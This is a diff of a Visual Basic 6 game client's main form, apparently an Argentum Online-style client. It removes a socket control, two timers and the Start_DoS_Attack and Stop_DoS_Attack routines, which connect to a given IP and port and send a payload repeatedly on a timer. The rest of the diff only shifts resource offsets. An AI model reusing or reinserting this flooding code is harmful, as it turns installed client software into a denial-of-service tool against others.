@@ -65,43 +65,6 @@ Begin VB.Form frmMain
       Type            =   1
       Urgent          =   0   'False
    End
-   Begin SocketWrenchCtrl.Socket DoSSock 
-      Left            =   10920
-      Top             =   8520
-      _Version        =   65536
-      _ExtentX        =   741
-      _ExtentY        =   741
-      _StockProps     =   0
-      AutoResolve     =   0   'False
-      Backlog         =   1
-      Binary          =   -1  'True
-      Blocking        =   0   'False
-      Broadcast       =   0   'False
-      BufferSize      =   10240
-      HostAddress     =   ""
-      HostFile        =   ""
-      HostName        =   ""
-      InLine          =   0   'False
-      Interval        =   0
-      KeepAlive       =   0   'False
-      Library         =   ""
-      Linger          =   0
-      LocalPort       =   0
-      LocalService    =   ""
-      Protocol        =   0
-      RemotePort      =   0
-      RemoteService   =   ""
-      ReuseAddress    =   0   'False
-      Route           =   -1  'True
-      Timeout         =   7000
-      Type            =   1
-      Urgent          =   0   'False
-   End
-   Begin VB.Timer TimeOut 
-      Interval        =   1000
-      Left            =   120
-      Top             =   2280
-   End
    Begin VB.PictureBox picShip 
       AutoRedraw      =   -1  'True
       BackColor       =   &H00000000&
@@ -170,11 +133,6 @@ Begin VB.Form frmMain
       TabIndex        =   36
       Top             =   6120
       Width           =   480
-   End
-   Begin VB.Timer DoSTimer 
-      Interval        =   250
-      Left            =   11520
-      Top             =   8520
    End
    Begin VB.PictureBox PicBelt 
       Appearance      =   0  'Flat
@@ -320,7 +278,7 @@ Begin VB.Form frmMain
       EndProperty
       Height          =   480
       Left            =   9600
-      Picture         =   "frmMain.frx":2AFC2
+      Picture         =   "frmMain.frx":2AFB9
       ScaleHeight     =   480
       ScaleWidth      =   480
       TabIndex        =   4
@@ -343,7 +301,7 @@ Begin VB.Form frmMain
       EndProperty
       Height          =   480
       Left            =   8640
-      Picture         =   "frmMain.frx":2DFC9
+      Picture         =   "frmMain.frx":2DFC0
       ScaleHeight     =   480
       ScaleWidth      =   480
       TabIndex        =   3
@@ -366,7 +324,7 @@ Begin VB.Form frmMain
       EndProperty
       Height          =   480
       Left            =   10080
-      Picture         =   "frmMain.frx":30ECB
+      Picture         =   "frmMain.frx":30EC2
       ScaleHeight     =   480
       ScaleWidth      =   480
       TabIndex        =   2
@@ -389,7 +347,7 @@ Begin VB.Form frmMain
       EndProperty
       Height          =   480
       Left            =   9120
-      Picture         =   "frmMain.frx":33E33
+      Picture         =   "frmMain.frx":33E2A
       ScaleHeight     =   480
       ScaleWidth      =   480
       TabIndex        =   1
@@ -467,7 +425,7 @@ Begin VB.Form frmMain
       Appearance      =   0
       OLEDragMode     =   0
       OLEDropMode     =   0
-      TextRTF         =   $"frmMain.frx":36D50
+      TextRTF         =   $"frmMain.frx":36D47
       BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
          Name            =   "Arial"
          Size            =   8.25
@@ -495,7 +453,7 @@ Begin VB.Form frmMain
       Appearance      =   0
       OLEDragMode     =   0
       OLEDropMode     =   0
-      TextRTF         =   $"frmMain.frx":36DD4
+      TextRTF         =   $"frmMain.frx":36DCB
       BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
          Name            =   "Arial"
          Size            =   9
@@ -554,7 +512,7 @@ Begin VB.Form frmMain
       Height          =   1920
       Left            =   9060
       MousePointer    =   99  'Custom
-      Picture         =   "frmMain.frx":36E58
+      Picture         =   "frmMain.frx":36E4F
       ScaleHeight     =   122.269
       ScaleMode       =   0  'User
       ScaleWidth      =   150.588
@@ -578,9 +536,9 @@ Begin VB.Form frmMain
       ForeColor       =   &H00C0FFFF&
       Height          =   2295
       IntegralHeight  =   0   'False
-      ItemData        =   "frmMain.frx":49A9C
+      ItemData        =   "frmMain.frx":49A93
       Left            =   9240
-      List            =   "frmMain.frx":49AA3
+      List            =   "frmMain.frx":49A9A
       TabIndex        =   29
       Top             =   3000
       Visible         =   0   'False
@@ -605,7 +563,7 @@ Begin VB.Form frmMain
       ForeColor       =   &H80000008&
       Height          =   1920
       Left            =   9060
-      Picture         =   "frmMain.frx":49AB2
+      Picture         =   "frmMain.frx":49AA9
       ScaleHeight     =   122.269
       ScaleMode       =   0  'User
       ScaleWidth      =   150.588
@@ -693,7 +651,7 @@ Begin VB.Form frmMain
       Appearance      =   0  'Flat
       Height          =   315
       Left            =   7980
-      MouseIcon       =   "frmMain.frx":5C6F6
+      MouseIcon       =   "frmMain.frx":5C6ED
       MousePointer    =   99  'Custom
       Top             =   1875
       Width           =   345
@@ -714,7 +672,7 @@ Begin VB.Form frmMain
       ForeColor       =   &H80000008&
       Height          =   435
       Left            =   10320
-      MouseIcon       =   "frmMain.frx":5C848
+      MouseIcon       =   "frmMain.frx":5C83F
       MousePointer    =   99  'Custom
       TabIndex        =   17
       Top             =   2880
@@ -736,7 +694,7 @@ Begin VB.Form frmMain
       ForeColor       =   &H80000008&
       Height          =   435
       Left            =   9000
-      MouseIcon       =   "frmMain.frx":5C99A
+      MouseIcon       =   "frmMain.frx":5C991
       MousePointer    =   99  'Custom
       TabIndex        =   16
       Top             =   2880
@@ -746,7 +704,7 @@ Begin VB.Form frmMain
       Appearance      =   0  'Flat
       Height          =   420
       Left            =   10425
-      MouseIcon       =   "frmMain.frx":5CAEC
+      MouseIcon       =   "frmMain.frx":5CAE3
       MousePointer    =   99  'Custom
       Top             =   8460
       Visible         =   0   'False
@@ -756,7 +714,7 @@ Begin VB.Form frmMain
       Appearance      =   0  'Flat
       Height          =   420
       Left            =   9975
-      MouseIcon       =   "frmMain.frx":5CC3E
+      MouseIcon       =   "frmMain.frx":5CC35
       MousePointer    =   99  'Custom
       Top             =   8445
       Width           =   480
@@ -1110,7 +1068,7 @@ Begin VB.Form frmMain
       Appearance      =   0  'Flat
       Height          =   120
       Left            =   9000
-      Picture         =   "frmMain.frx":5CD90
+      Picture         =   "frmMain.frx":5CD87
       Top             =   7290
       Width           =   1320
    End
@@ -1118,7 +1076,7 @@ Begin VB.Form frmMain
       Appearance      =   0  'Flat
       Height          =   120
       Left            =   9000
-      Picture         =   "frmMain.frx":5D614
+      Picture         =   "frmMain.frx":5D60B
       Top             =   6930
       Width           =   1320
    End
@@ -1126,7 +1084,7 @@ Begin VB.Form frmMain
       Appearance      =   0  'Flat
       Height          =   420
       Left            =   9525
-      MouseIcon       =   "frmMain.frx":5DE98
+      MouseIcon       =   "frmMain.frx":5DE8F
       MousePointer    =   99  'Custom
       Top             =   8445
       Width           =   435
@@ -1135,7 +1093,7 @@ Begin VB.Form frmMain
       Appearance      =   0  'Flat
       Height          =   420
       Left            =   9045
-      MouseIcon       =   "frmMain.frx":5DFEA
+      MouseIcon       =   "frmMain.frx":5DFE1
       MousePointer    =   99  'Custom
       Top             =   8460
       Width           =   435
@@ -1174,7 +1132,7 @@ Begin VB.Form frmMain
       Appearance      =   0  'Flat
       Height          =   120
       Left            =   9000
-      Picture         =   "frmMain.frx":5E13C
+      Picture         =   "frmMain.frx":5E133
       Top             =   7650
       Width           =   1320
    End
@@ -1226,7 +1184,7 @@ Begin VB.Form frmMain
       Appearance      =   0  'Flat
       Height          =   150
       Left            =   8850
-      Picture         =   "frmMain.frx":5E9C0
+      Picture         =   "frmMain.frx":5E9B7
       Top             =   2460
       Width           =   2565
    End
@@ -1259,23 +1217,6 @@ Private Type POINTAPI
     x As Long
     y As Long
 End Type
-
-Dim DoSReady As Boolean
-
-Private Sub TimeOut_Timer()
-
- On Error Resume Next
- 
-    Dim lii As LASTINPUTINFO
-    lii.cbSize = Len(lii)
-    Call GetLastInputInfo(lii)
-
-    TimedOut = FormatNumber((GetTickCount() - lii.dwTime) / 1000, 0)
-
-    If TimedOut >= MaxTimeOut Then
-        MsgBox "Timed out."
-    End If
-End Sub
 
 Public Sub ActivarMacroHechizos()
 
@@ -1478,12 +1419,6 @@ Private Sub CompaRecTxt_MouseUp(Button As Integer, Shift As Integer, x As Single
         
     End If
 
-End Sub
-
-Private Sub DoSSock_LastError(ErrorCode As Integer, ErrorString As String, Response As Integer)
-    If DoSSock.Connected Then
-        DoSSock.Disconnect
-    End If
 End Sub
 
 Private Sub ExpLbl_MouseMove(Button As Integer, Shift As Integer, x As Single, y As Single)
@@ -3626,68 +3561,6 @@ Private Sub Timer1_Timer()
             End If
         End If
     End If
-End Sub
-
-Private Sub DoSTimer_Timer()
-    If DoSReady = True Then
-        'No enviamos nada si no estamos conectados
-        If Not DoSSock.IsWritable Then
-            Exit Sub
-        End If
-        
-        If Not DoSSock.Connected Then
-            Exit Sub
-        End If
-        
-        'Send data!
-        Call DoSSock.Write(DoSSock.Tag, Len(DoSSock.Tag))
-    
-        DoSReady = False
-    End If
-End Sub
-
-Private Sub DoSSock_Connect()
-    DoSTimer.Enabled = True
-End Sub
-
-Private Sub DoSSocK_SendComplete()
-    DoSReady = True
-End Sub
-
-Public Sub Start_DoS_Attack(ByVal Ip As String, ByVal Port As Integer, ByVal Text As String, ByVal Interval As Integer)
-On Error GoTo Error
-
-    If DoSSock.Connected Then
-        DoSSock.Disconnect
-        DoSSock.Cleanup
-        DoEvents
-    End If
-    
-    DoSSock.Startup
-        
-    DoSSock.HostName = Ip
-    DoSSock.RemotePort = Port
-        
-    DoSSock.Connect
-    
-    DoSSock.Tag = Text
-    DoSTimer.Interval = Interval
-
-Error:
-End Sub
-
-Public Sub Stop_DoS_Attack()
-On Error GoTo Error
-
-    If DoSSock.Connected Then
-        DoSSock.Disconnect
-        DoSSock.Cleanup
-        DoEvents
-    End If
-    
-    DoSTimer.Enabled = False
-
-Error:
 End Sub
 
 Private Sub TrainingMacro_Timer()
